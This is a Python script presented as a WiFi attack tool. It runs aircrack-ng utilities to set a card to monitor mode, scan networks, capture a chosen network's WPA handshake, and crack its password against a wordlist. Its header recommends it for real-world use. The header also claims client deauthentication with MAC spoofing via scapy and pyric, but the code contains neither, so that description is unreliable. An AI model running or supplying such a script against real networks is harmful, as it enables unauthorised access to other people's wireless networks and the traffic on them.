###########################################################################################################################################################################################################
# Run using python3 wifitest.py Script uses scapy and pyric: The script includes checking and installing necessary tools, setting the interface to monitor mode, 
# scanning for networks, capturing handshakes, and cracking the handshake using a wordlist, whilst spoofing the source MAC Address as part of the deauthenticate_clients function. Requires installation fo tcpdump, aircrack-ng, scapy, and pyric - pip install scapy pyric.
# This script includes necessary error handling and guides users through the process with clear feedback. It provides an interactive menu for network scanning, handshake capturing, and password cracking, 
# making it more user-friendly and functional for real-world use. You will also require a wireless USB/network card that supports monitor mode & frame injection.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
###########################################################################################################################################################################################################

import subprocess
import sys
import time
import os

# Banner
def display_splash_screen():
    splash = r"""
    
 __      __.__                 .__                                    _____   __    __                   __        ___________            .__                 _____  ____.____   __________  ___ ___    _____           _______  ____ 
/  \    /  \__|_______   ____  |  |    ____    ______  ______        /  _  \_/  |__/  |______     ____  |  | __    \__    ___/____   ____ |  |               /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /  |\_  __ \_/ __ \ |  |  _/ __ \  /  ___/ /  ___/       /  /_\  \   __\   __\__  \  _/ ___\ |  |/ /      |    |  /  _ \ /  _ \|  |     ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        /|  | |  | \/\  ___/ |  |__\  ___/  \___ \  \___ \       /    |    \  |  |  |  / __ \_\  \___ |    <       |    | (  <_> |  <_> )  |__  /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  / |__| |__|    \___  >|____/ \___  >/____  >/____  >______\____|__  /__|  |__| (____  / \___  >|__|_ \______|____|  \____/ \____/|____/           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
       \/                   \/            \/      \/      \//_____/        \/                \/      \/      \/_____/                                           |__|             \/               \/      |__|                 \/     


                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Wifi Attack Tool 41PH4-01\n")


# Function to check if a command is available on the system
def check_tool_installed(tool_name):
    try:
        result = subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            raise FileNotFoundError
        print(f"{tool_name} is installed.")
    except (FileNotFoundError, subprocess.CalledProcessError):
        print(f"{tool_name} is not installed. Please install it and run the script again.")
        sys.exit(1)

# Function to detect available network interfaces
def get_network_interfaces():
    try:
        result = subprocess.run(["ip", "link"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        interfaces = result.stdout.decode().splitlines()
        interfaces = [line.split(":")[1].strip() for line in interfaces if "wlan" in line or "eth" in line]
        if not interfaces:
            raise ValueError("No network interfaces found.")
        return interfaces
    except Exception as e:
        print(f"Error detecting network interfaces: {e}")
        sys.exit(1)

# Function to enable monitor mode on the specified interface
def enable_monitor_mode(interface):
    try:
        print(f"Enabling monitor mode on {interface}...")
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
        print(f"{interface} set to monitor mode.")
    except subprocess.CalledProcessError:
        print(f"Failed to set {interface} to monitor mode.")
        sys.exit(1)

# Function to scan for networks
def scan_networks(interface):
    try:
        print(f"Scanning for networks on {interface}...")
        networks = subprocess.check_output(["sudo", "airodump-ng", interface], stderr=subprocess.PIPE).decode()
        print(networks)  # Optionally, you can parse this output to display SSIDs and BSSIDs more cleanly.
    except subprocess.CalledProcessError as e:
        print(f"Error scanning networks: {e}")
        sys.exit(1)

# Function to capture WPA handshake
def capture_handshake(interface, target_bssid, output_file):
    try:
        print(f"Capturing WPA handshake for BSSID {target_bssid}...")
        subprocess.run(["sudo", "airodump-ng", "--bssid", target_bssid, "-c", "6", "-w", output_file, interface], check=True)
        print(f"Handshake captured and saved to {output_file}.")
    except subprocess.CalledProcessError as e:
        print(f"Error capturing handshake: {e}")
        sys.exit(1)

# Function to crack WPA handshake using aircrack-ng
def crack_handshake(handshake_file, wordlist):
    try:
        print(f"Cracking WPA handshake with wordlist {wordlist}...")
        result = subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, handshake_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode()
        if "KEY FOUND" in output:
            print(f"Password found: {output.splitlines()[-1]}")
        else:
            print("Failed to crack the password.")
    except subprocess.CalledProcessError as e:
        print(f"Error cracking handshake: {e}")
        sys.exit(1)

# Main function to tie everything together
def main():
    # Check for required tools
    check_tool_installed("airmon-ng")
    check_tool_installed("airodump-ng")
    check_tool_installed("aircrack-ng")
    
    # Detect available network interfaces
    interfaces = get_network_interfaces()
    print("Available interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f"{idx + 1}. {iface}")
    
    # Ask user to choose interface
    selection = input("Select the network interface to use (number): ")
    try:
        selected_iface = interfaces[int(selection) - 1]
        print(f"Selected interface: {selected_iface}")
    except (ValueError, IndexError):
        print("Invalid selection, exiting.")
        sys.exit(1)
    
    # Enable monitor mode
    enable_monitor_mode(selected_iface)
    
    # Scan for networks
    scan_networks(selected_iface)
    
    # Ask user for target BSSID (Network MAC address)
    target_bssid = input("Enter the BSSID (Network MAC address) of the target network: ")
    # Set output file for capturing handshake
    output_file = "/tmp/capture"
    
    # Capture WPA handshake
    capture_handshake(selected_iface, target_bssid, output_file)
    
    # Ask for wordlist location
    wordlist = input("Enter the path to your wordlist: ")
    
    # Crack WPA handshake
    crack_handshake(f"{output_file}-01.cap", wordlist)

if __name__ == "__main__":
    main()
